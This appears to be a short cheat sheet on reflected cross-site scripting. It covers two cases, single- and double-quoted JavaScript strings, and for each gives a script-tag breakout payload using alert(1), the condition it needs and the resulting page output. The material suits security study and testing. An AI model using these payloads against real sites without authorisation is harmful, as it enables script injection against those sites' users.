1. XSS into JavaScript String without Angle Brackets Encoded (Single Quote)
- Payload: </script><script>alert(1)//
- Condition: Input is reflected inside a JavaScript string context where angle brackets (< >) are NOT encoded
- Case: Angle brackets are not filtered so closing script tag can be used to break out of the string
- Output: <script>var x='</script><script>alert(1)//';</script>

---

2. XSS into JavaScript String without Angle Brackets Encoded (Double Quote)
- Payload: </script><script>alert(1)//
- Condition: Input is reflected inside a JavaScript string context where angle brackets (< >) are NOT encoded
- Case: Angle brackets are not filtered so closing script tag can be used to break out of the string
- Output: <script>var x="</script><script>alert(1)//";</script>
